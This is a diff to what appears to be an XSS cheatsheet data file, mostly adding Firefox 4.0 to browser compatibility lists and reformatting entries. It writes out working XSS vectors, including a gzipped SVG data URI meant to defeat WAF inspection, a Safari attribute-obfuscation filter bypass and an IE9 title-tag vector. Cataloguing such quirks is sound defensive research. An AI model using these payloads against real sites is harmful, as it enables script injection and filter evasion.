@@ -25,6 +25,7 @@ var items =
             'de' : ''
         },
         'browsers'   : {
+		    'firefox' : ['4.0'],
             'opera': ['10.5', '10.6', 'mobile']
         },
         'tags'       : ['xss', 'html5', 'opera', 'formaction', 'javascript', 'button'],
@@ -148,7 +149,7 @@ var items =
         },          
         'browsers'   : {
             'firefox': [
-                '2.x', '3.x', '3.5', '3.6', '3.7'
+                '2.x', '3.x', '4.0'
             ]
         },
         'tags'       : ['xss', 'dom', 'firefox', 'crypto', 'eval', 'csp', 'proprietary'],
@@ -209,6 +210,7 @@ var items =
             'de' : ''
         },          
         'browsers'   : {
+		    'firefox' : ['4.0'],
             'opera': ['10.5', '10.6'],
             'safari' : ['4.0'],
             'chrome': ['4.0', '5.0', '6.0']
@@ -240,6 +242,7 @@ var items =
             'de' : ''
         },    
         'browsers'   : {
+		    'firefox' : ['4.0'],
             'safari' : ['4.0'],
             'chrome': [
                 '4.0', '5.0', '6.0'
@@ -333,12 +336,8 @@ var items =
         },                        
         'browsers'   : {
             'opera': ['10.0', '10.5', '10.6'],
-            'chrome': [
-                '4.0', '5.0', '6.0'
-            ],
-            'firefox': [
-                '3.0', '3.5', '3.6', '3.7'
-            ]            
+            'chrome': ['4.0', '5.0', '6.0'],
+            'firefox': ['3.0', '3.5', '3.6', '3.7']            
         },
         'tags'       : ['xss', 'svg', 'onload', 'opera', 'firefox', 'chrome'],
         'reporter'   : '.mario'
@@ -367,11 +366,10 @@ var items =
             'de' : ''
         },          
         'browsers'   : {
+		    'firefox' : ['4.0'],
             'opera': ['10.5', '10.6'],
             'safari' : ['4.0'],
-            'chrome': [
-                '4.0', '5.0', '6.0'
-            ]
+            'chrome': ['4.0', '5.0', '6.0']
         },
         'tags'       : ['xss', 'autofocus', 'scroll', 'chrome', 'opera'],
         'reporter'   : '.mario'
@@ -458,7 +456,7 @@ var items =
             'de' : ''
         },          
         'browsers'   : {
-            'firefox': ['2.x', '3.0', '3.5', '3.6', '3.7']
+            'firefox': ['2.x', '3.x', '4.0']
         },
         'tags'       : ['xss', 'javascript', 'firefox', 'sharp', 'proprietary'],
         'reporter'   : '.mario'
@@ -530,7 +528,7 @@ var items =
             'ru' : 'HTML-эквиваленты внутри <SCRIPT> и аналогичных тегов',
             'de' : ''
         },
-        'data'       : '<script>%js_alert_entities%</script>',
+        'data'       : '<script xmlns="http://www.w3.org/1999/xhtml">%js_alert_entities%</script>',
         'description': {
             'en' : 'By specification user agents allow using HTML entities between <SCRIPT> and <STYLE> tags in case the document is being delivered and rendered as X(HT)ML.',
             'ja' : '',
@@ -546,7 +544,7 @@ var items =
         },            
         'browsers'   : {
             'opera': ['8.x', '9.x', '10.x'], 
-            'firefox' : ['1.x', '2.x', '3.x'], 
+            'firefox' : ['1.x', '2.x', '3.x', '4.0'], 
             'chrome': ['3.0', '4.0', '5.0', '6.0']
         },
         'tags'       : ['xss', 'javascript', 'opera', 'xml', 'css'],
@@ -606,7 +604,7 @@ var items =
         },            
         'browsers'   : {
             'opera': ['8.x', '9.x', '10.x'], 
-            'firefox' : ['1.x', '2.x', '3.x'], 
+            'firefox' : ['1.x', '2.x', '3.x', '4.0'], 
             'chrome': ['3.0', '4.0', '5.0', '6.0'],
             'safari': ['4.x']
         },
@@ -637,7 +635,7 @@ var items =
             'de' : ''
         },          
         'browsers'   : {
-            'firefox' : ['3.5', '3.6', '3.7'] 
+            'firefox' : ['3.5', '3.6', '3.7', '4.0'] 
         },
         'tags'       : ['xss', 'javascript', 'firefox', '__noSuchMethod__', 'proprietary'],
         'reporter'   : 'Gareth, .mario'
@@ -666,6 +664,7 @@ var items =
             'de' : ''
         },            
         'browsers'   : {
+		    'firefox' : ['4.0'],
             'opera': ['8.x', '9.x', '10.x'], 
             'chrome': ['3.0', '4.0', '5.0', '6.0']
         },
@@ -754,7 +753,7 @@ var items =
             'de' : ''
         },            
         'browsers'   : {
-            'firefox' : ['1.5', '2.x', '3.x']
+            'firefox' : ['1.5', '2.x', '3.x', '4.0']
         },
         'tags'       : ['xss', 'javascript', 'firefox', 'e4x', 'self-inclusion', 'proprietary'],
         'reporter'   : '.mario'
@@ -783,7 +782,7 @@ var items =
             'de' : ''
         },            
         'browsers'   : {
-            'firefox' : ['1.5', '2.x', '3.x']
+            'firefox' : ['1.5', '2.x', '3.x', '4.0']
         },
         'tags'       : ['xss', 'javascript', 'firefox', 'e4x', 'stealing', 'utf7', 'proprietary'],
         'reporter'   : '.mario'
@@ -930,7 +929,7 @@ var items =
         'browsers'   : {
             'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0'],
             'opera': ['8.x', '9.x', '10.x', 'mobile'], 
-            'firefox' : ['1.x', '2.x', '3.x'], 
+            'firefox' : ['1.x', '2.x', '3.x', '4.0'], 
             'chrome': ['3.0', '4.0', '5.0', '6.0'],
             'safari': ['3.0', '4.0']
         },
@@ -991,7 +990,7 @@ var items =
             'de' : ''
         },            
         'browsers'   : {
-            'firefox': ['3.6', '3.7'] 
+            'firefox': ['3.6', '3.7', '4.0'] 
         },
         'tags'       : ['xss', 'hijacking', 'css', 'pointer-events', 'firefox'],
         'reporter'   : '.mario'
@@ -1116,7 +1115,7 @@ var items =
         'browsers'   : {
             'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0'],
             'opera': ['8.x', '9.x', '10.x', 'mobile'], 
-            'firefox' : ['1.x', '2.x', '3.x'], 
+            'firefox' : ['1.x', '2.x', '3.x', '4.0'], 
             'chrome': ['3.0', '4.0', '5.0', '6.0'],
             'safari': ['3.0', '4.0']
         },
@@ -1208,7 +1207,7 @@ var items =
         'browsers'   : {
             'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0'],
             'opera': ['8.x', '9.x', '10.x', 'mobile'], 
-            'firefox' : ['1.x', '2.x', '3.x'], 
+            'firefox' : ['1.x', '2.x', '3.x', '4.0'], 
             'chrome': ['3.0', '4.0', '5.0', '6.0'],
             'safari': ['3.0', '4.0']
         },
@@ -1372,7 +1371,7 @@ var items =
         },            
         'browsers'   : {
             'opera': ['8.0', '9.0', '10.x', 'mobile'],
-            'firefox' : ['1.x', '2.x', '3.x'],
+            'firefox' : ['1.x', '2.x', '3.x', '4.0'],
             'chrome': ['3.0', '4.0', '5.0', '6.0'],
             'safari': ['3.0', '4.0']
         },
@@ -1432,15 +1431,9 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'opera': [
-                '10.x'
-            ],
-            'chrome': [
-                '4.0', '5.0', '6.0'
-            ],
-            'firefox': [
-                '3.0', '3.5', '3.6', '3.7'
-            ],
+            'opera': ['10.x'],
+            'chrome': ['4.0', '5.0', '6.0'],
+            'firefox': ['3.x', '4.0'],
             'internet explorer': ['9.0']
         },
         'tags'       : ['xss', 'svg', 'script', 'opera', 'firefox', 'chrome', 'internet explorer'],
@@ -1530,7 +1523,7 @@ var items =
         },                        
         'browsers'   : {
             'opera': ['8.x', '9.x', '10.x', 'mobile'], 
-            'firefox' : ['1.x', '2.x', '3.x'], 
+            'firefox': ['1.x', '2.x', '3.x', '4.0'], 
             'chrome': ['3.0', '4.0', '5.0', '6.0'],
             'safari': ['4.x']
         },
@@ -1664,15 +1657,9 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'opera': [
-                '10.0', 'mobile'
-            ],
-            'chrome': [
-                '4.0', '5.0', '6.0'
-            ],
-            'firefox': [
-                '1.x', '2.x', '3.0'
-            ]
+            'opera': ['10.0', 'mobile'],
+            'chrome': ['4.0', '5.0', '6.0'],
+            'firefox': ['1.x', '2.x', '3.0']
         },
         'tags'       : ['xss', 'javascript', 'json', '__definesetter__', 'object', 'prototype'],
         'reporter'   : '.mario'
@@ -1731,7 +1718,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'firefox': ['3.5', '3.6', '3.7'], 
+            'firefox': ['3.5', '3.6', '3.7', '4.0'], 
 			'internet explorer' :  ['9.0']
         },
         'tags'       : ['xss', 'javascript', 'video', 'source', 'html5', 'firefox', 'audio'],
@@ -1821,9 +1808,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'internet explorer': [
-                '6.0', '7.0', '8.0'
-            ]
+            'internet explorer': ['6.0', '7.0', '8.0']
         },
         'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml'],
         'reporter'   : 'hasegawayosuke'
@@ -1852,7 +1837,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'firefox': ['2.x', '3.x'],
+            'firefox': ['2.x', '3.x', '4.0'],
             'opera': ['9.x', '10.x', 'mobile'],
             'internet explorer': ['6.0', '7.0', '8.0'],
             'chrome' : ['5.0', '6.0'],
@@ -1892,7 +1877,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'firefox': ['1.5', '2.x', '3.x'],
+            'firefox': ['1.5', '2.x', '3.x', '4.0'],
             'opera': ['8.x', '9.x', '10.x', 'mobile'],
             'internet explorer': ['6.0', '7.0', '8.0', '9.0']
         },
@@ -1923,9 +1908,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'internet explorer': [
-                '6.0', '7.0', '8.0', '9.0'
-            ]                       
+            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
         },
         'tags'       : ['xss', 'javascript', 'attribute', 'simulating', 'parser', 'regex'],
         'reporter'   : 'Algol, LeverOne, White Jordan'
@@ -1954,7 +1937,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'firefox': ['1.5', '2.x', '3.x'],
+            'firefox': ['1.5', '2.x', '3.x', '4.0'],
 			'chrome': ['4.0', '5.0', '6.0'],
             'opera': ['8.x', '9.x', '10.0', 'mobile'],
             'internet explorer': ['6.0', '7.0'],
@@ -2026,7 +2009,7 @@ var items =
         'browsers'   : {
             'chrome': ['4.0', '5.0', '6.0'],
             'safari': ['3.4', '4.x'],
-			'firefox': ['3.0', '3.5', '3.6', '3.7'],
+			'firefox': ['3.x', '4.0'],
 			'opera': ['9.x', '10.x']
         },
         'tags'       : ['xss', 'svg', 'onload','chrome','firefox','safari','opera'],
@@ -2089,7 +2072,7 @@ var items =
         'browsers'   : {
             'chrome': ['4.0', '5.0', '6.0'],
             'safari': ['3.0', '4.0'],
-            'firefox': ['3.0', '3.5', '3.6', '3.7'],        
+            'firefox': ['3.0', '3.5', '3.6', '3.7', '4.0'],        
             'opera': ['8.0', '9.0', '10.x', 'mobile']
         },
         'tags'       : ['xss', 'javascript', 'opera', 'attlist', 'doctype', 'chrome', 'firefox', 'safari'],
@@ -2235,6 +2218,7 @@ var items =
             'de' : ''
         },
         'browsers'   : {
+		    'firefox': ['4.0'],
             'opera': ['10.5', '10.6', 'mobile']
         },
         'tags'       : ['xss', 'html5', 'opera', 'formaction', 'javascript', 'button'],
@@ -2467,7 +2451,7 @@ var items =
         },                        
         'browsers'   : {
             'safari': ['3.4', '4.x'],
-            'firefox': ['1.5', '2.x', '3.x'],        
+            'firefox': ['1.5', '2.x', '3.x', '4.0'],        
             'opera': ['10.x', 'mobile'],
             'internet explorer': ['6.0', '7.0', '8.0', '9.0']
         },
@@ -2679,7 +2663,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'firefox' : ['3.6', '3.7'], 
+            'firefox' : ['3.6', '3.7', '4.0'], 
             'safari' : ['4.0'], 
             'chrome' : ['4.0', '5.0', '6.0'],
             'opera': ['9.x', '10.x', 'mobile']
@@ -2711,10 +2695,10 @@ var items =
             'de' : ''
         }, 
         'browsers'   : {
-            'chrome' : ['4.0', '5.0', '6.0'],
-            'safari' : ['3.4', '4.x'],
-	    'firefox': ['3.0', '3.5', '3.6', '3.7'],
-	    'opera'  : ['9.x', '10.x']
+           'chrome' : ['4.0', '5.0', '6.0'],
+           'safari' : ['3.4', '4.x'],
+	       'firefox': ['3.x', '4.0'],
+	       'opera'  : ['9.x', '10.x']
         },
         'tags'       : ['xss', 'svg', 'passive', 'xlink', 'chrome', 'firefox', 'safari', 'opera'],
         'reporter'   : 'LeverOne'
@@ -2743,7 +2727,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-	    'opera'  : ['9.x', '10.x']
+	       'opera'  : ['9.x', '10.x']
         },
         'tags'       : ['xss', 'svg', 'active', 'xlink', 'opera'],
         'reporter'   : 'LeverOne'
@@ -2809,7 +2793,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-	    'opera'  : ['10.x']
+	       'opera'  : ['10.x']
         },
         'tags'       : ['xss', 'svg', 'css', 'opera', 'content', 'form'],
         'reporter'   : 'LeverOne'
@@ -2929,7 +2913,7 @@ var items =
             'de' : ''
         },
         'browsers'   : {
-	    'opera'  : ['10.x', '10.5', '10.6', 'mobile']
+            'opera'  : ['10.x', '10.5', '10.6', 'mobile']
         },
         'tags'       : ['xss', 'svg', 'opera', 'XML-events'],
         'reporter'   : 'LeverOne'
@@ -2958,7 +2942,7 @@ var items =
             'de' : ''
         },
         'browsers'   : {
-        'opera'  : ['10.x', '10.5', '10.6', 'mobile']
+            'opera'  : ['10.x', '10.5', '10.6', 'mobile']
         },
         'tags'       : ['xss', 'svg', 'opera', 'filter effects', 'feimage'],
         'reporter'   : '.mario'
@@ -2994,9 +2978,7 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'internet explorer': [
-                '5.0','6.0', '7.0', '8.0'
-            ]
+            'internet explorer': ['5.0','6.0', '7.0', '8.0']
         },
         'tags'       : ['xss', 'internet explorer', 'archive', 'mhtml'],
         'reporter'   : 'Bolk, LeverOne'
@@ -3056,12 +3038,8 @@ var items =
             'de' : ''
         },                        
         'browsers'   : {
-            'internet explorer': [
-                '6.0', '7.0', '8.0'
-            ],
-            'firefox': [
-                '2.x', '3.x'
-            ] 
+            'internet explorer': ['6.0', '7.0', '8.0'],
+            'firefox': ['2.x', '3.x'] 
         },
         'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml', 'css'],
         'reporter'   : 'sdc'
@@ -3091,7 +3069,7 @@ var items =
         },                        
         'browsers'   : {
             'internet explorer': ['6.0', '7.0', '8.0'],
-            'firefox': ['3.x', '4.x'],
+            'firefox': ['3.x', '4.0'],
             'opera'  : ['9.x', '10.x', 'mobile'],
             'chrome' : ['4.0', '5.0', '6.0'],
             'safari' : ['3.x', '4.x', '5.x'],
@@ -3124,7 +3102,7 @@ var items =
         },                        
         'browsers'   : {
             'internet explorer': ['6.0', '7.0', '8.0'],
-            'firefox': ['3.x', '4.x'],
+            'firefox': ['2.x', '3.x', '4.0'],
             'opera'  : ['9.x', '10.x', 'mobile'],
             'chrome' : ['5.0', '6.0'],
             'safari' : ['4.x', '5.x'],
@@ -3249,92 +3227,92 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'svg', 'tinysvg', 'listener', 'xml', 'events'],
         'reporter'   : '.mario'
+    },
+    { /* ID 105 - SVG payload obfuscation with gzipped HTML and MIME type image/svg-xml */
+        'id'         : 105,
+        'category'   : 'svg', 
+        'name'       : {
+            'en' : ' SVG payload obfuscation with gzipped HTML and MIME type image/svg-xml',
+            'ja' : '',
+            'ru' : 'Обфускация полезной SVG-нагрузки с помощью HTML-разметки, сжатой gzip, и MIME-типа image/svg-xml',
+            'de' : ''
         },
-        { /* ID 105 - SVG payload obfuscation with gzipped HTML and MIME type image/svg-xml */
-            'id'         : 105,
-            'category'   : 'svg', 
-            'name'       : {
-                'en' : ' SVG payload obfuscation with gzipped HTML and MIME type image/svg-xml',
-                'ja' : '',
-                'ru' : 'Обфускация полезной SVG-нагрузки с помощью HTML-разметки, сжатой gzip, и MIME-типа image/svg-xml',
-                'de' : ''
-            },
-            'data'       : '<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>',
-            'description': {
-                'en' : 'Opera allows displaying compressed SVG images without the usually necessary encoding header. This works for almost arbitrary data as long as the content type image/svg+xml is set - or image/svg-xml like in this example.\r\n\r\nNotice that the compressed data can be truncated. Opera will still accept it and render the <script> tag and execute the alert(1) - most other Gzip parsers will break though - rendering any WAF or similar tool trying to analyze the payload useless (gzip 1.3.12 states the payload contains 50+ MB of binary gibberish).\r\n\r\nThe example contains no actual SVG code - just a regular <script> tag with a XHTML namespace attribute.',
-                'ja' : '',
-                'ru' : 'Opera отображает сжатое SVG-изображение без обычно необходимого заголовка encoding. Этот приём работает в отношении практически любых удаленных данных, если установлен тип содержимого image/svg+xml или, как в данном случае, image/svg-xml.\r\n\r\nОбратите внимание, что удаленные данные могут быть искажены. Opera все равно примет их, распознает тег <script> и исполнит его содержимое (хотя большинство других Gzip-парсеров сломается). Попытки любых WAF и тому подобных программ проанализировать полезную нагрузку на данный момент потерпят неудачу (gzip 1.3.12 устанавливает размер возможной полезной нагрузки в 50+ МВ).\r\n\r\nПример не содержит ожидаемого SVG-кода: только обычный тег <script> с пространством имен XHTML.',
-                'de' : ''
-            },
-            'urls'    : ['http://www.w3.org/TR/2002/CR-SVG11-20020430/minimize.html'],
-            'howtofix'   : {
-                'en' : '',
-                'ja' : '',
-                'ru' : '',
-                'de' : ''
-            },                        
-            'browsers'   : {
-                'opera' : ['10.x', 'mobile']
-            },
-            'tags'       : ['xss', 'javascript', 'svg', 'svgz', 'gzip', 'xml', 'compression'],
-            'reporter'   : '.mario'
+        'data'       : '<iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>',
+        'description': {
+            'en' : 'Opera allows displaying compressed SVG images without the usually necessary encoding header. This works for almost arbitrary data as long as the content type image/svg+xml is set - or image/svg-xml like in this example.\r\n\r\nNotice that the compressed data can be truncated. Opera will still accept it and render the <script> tag and execute the alert(1) - most other Gzip parsers will break though - rendering any WAF or similar tool trying to analyze the payload useless (gzip 1.3.12 states the payload contains 50+ MB of binary gibberish).\r\n\r\nThe example contains no actual SVG code - just a regular <script> tag with a XHTML namespace attribute.',
+            'ja' : '',
+            'ru' : 'Opera отображает сжатое SVG-изображение без обычно необходимого заголовка encoding. Этот приём работает в отношении практически любых удаленных данных, если установлен тип содержимого image/svg+xml или, как в данном случае, image/svg-xml.\r\n\r\nОбратите внимание, что удаленные данные могут быть искажены. Opera все равно примет их, распознает тег <script> и исполнит его содержимое (хотя большинство других Gzip-парсеров сломается). Попытки любых WAF и тому подобных программ проанализировать полезную нагрузку на данный момент потерпят неудачу (gzip 1.3.12 устанавливает размер возможной полезной нагрузки в 50+ МВ).\r\n\r\nПример не содержит ожидаемого SVG-кода: только обычный тег <script> с пространством имен XHTML.',
+            'de' : ''
         },
-        { /* ID 106 - Safari attribute ofuscation with slashes and quotes */
-            'id'         : 106,
-            'category'   : 'html', 
-            'name'       : {
-                'en' : 'Safari attribute ofuscation with slashes and quotes',
-                'ja' : '',
-                'ru' : 'Обфускация атрибута в Safari с использованием слешей и кавычек',
-                'de' : ''
-            },
-            'data'       : '<img src onerror /" \'"= alt=%js_alert%//">',
-            'description': {
-                'en' : 'Safari accepts slashes and quotes (if preceded by whitespace, slashes or other quotes) between attribute names and the equals character (name/"\'=value). This enables interesting possibilities to obfuscate HTML strings, bypass filters and mimick attributes like in the given example.',
-                'ja' : '',
-                'ru' : 'Safari игнорирует слеши и кавычки (если им предшествует пробельный символ, слеш или другая кавычка) между именем атрибута и знаком равенства. Это открывает интересные возможности обфусцировать HTML, обойти фильтр, внешне замаскировав атрибут, как в приведенном примере.',
-                'de' : ''
-            },
-            'urls'    : [],
-            'howtofix'   : {
-                'en' : '',
-                'ja' : '',
-                'ru' : '',
-                'de' : ''
-            },                        
-            'browsers'   : {
-                'safari' : ['4.x', '5.x']
-            },
-            'tags'       : ['xss', 'javascript', 'safari', 'attributes', 'delimiter', 'parser'],
-            'reporter'   : 'Superhei, .mario'
+        'urls'    : ['http://www.w3.org/TR/2002/CR-SVG11-20020430/minimize.html'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'opera' : ['10.x', 'mobile']
         },
-        { /* ID 107 - JavaScript execution via title tag on Inernet Explorer 9 */
-            'id'         : 107,
-            'category'   : 'html', 
-            'name'       : {
-                'en' : 'JavaScript execution via title tag on Inernet Explorer 9',
-                'ja' : '',
-                'ru' : '',
-                'de' : ''
-            },
-            'data'       : '<title onpropertychange=alert(1)></title><title title=>',
-            'description': {
-                'en' : 'Internet Explorer 9 allows execution of JavaScript via onpropertychange event handler on <title> tags if another <title> tag follows up - having at least one valid attribute.',
-                'ja' : '',
-                'ru' : '',
-                'de' : ''
-            },
-            'urls'    : [],
-            'howtofix'   : {
-                'en' : '',
-                'ja' : '',
-                'ru' : '',
-                'de' : ''
-            },                        
-            'browsers'   : {
-                'internet explorer' : ['9.0']
-            },
-            'tags'       : ['xss', 'javascript', 'title', 'onpropertychange', 'internet explorer'],
-            'reporter'   : '.mario'
-        }
+        'tags'       : ['xss', 'javascript', 'svg', 'svgz', 'gzip', 'xml', 'compression'],
+        'reporter'   : '.mario'
+    },
+    { /* ID 106 - Safari attribute ofuscation with slashes and quotes */
+        'id'         : 106,
+        'category'   : 'html', 
+        'name'       : {
+            'en' : 'Safari attribute ofuscation with slashes and quotes',
+            'ja' : '',
+            'ru' : 'Обфускация атрибута в Safari с использованием слешей и кавычек',
+            'de' : ''
+        },
+        'data'       : '<img src onerror /" \'"= alt=%js_alert%//">',
+        'description': {
+            'en' : 'Safari accepts slashes and quotes (if preceded by whitespace, slashes or other quotes) between attribute names and the equals character (name/"\'=value). This enables interesting possibilities to obfuscate HTML strings, bypass filters and mimick attributes like in the given example.',
+            'ja' : '',
+            'ru' : 'Safari игнорирует слеши и кавычки (если им предшествует пробельный символ, слеш или другая кавычка) между именем атрибута и знаком равенства. Это открывает интересные возможности обфусцировать HTML, обойти фильтр, внешне замаскировав атрибут, как в приведенном примере.',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'safari' : ['4.x', '5.x']
+        },
+        'tags'       : ['xss', 'javascript', 'safari', 'attributes', 'delimiter', 'parser'],
+        'reporter'   : 'Superhei, .mario'
+    },
+    { /* ID 107 - JavaScript execution via title tag on Inernet Explorer 9 */
+        'id'         : 107,
+        'category'   : 'html', 
+        'name'       : {
+            'en' : 'JavaScript execution via title tag on Inernet Explorer 9',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<title onpropertychange=alert(1)></title><title title=>',
+        'description': {
+            'en' : 'Internet Explorer 9 allows execution of JavaScript via onpropertychange event handler on <title> tags if another <title> tag follows up - having at least one valid attribute.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer' : ['9.0']
+        },
+        'tags'       : ['xss', 'javascript', 'title', 'onpropertychange', 'internet explorer'],
+        'reporter'   : '.mario'
+    }
 ]
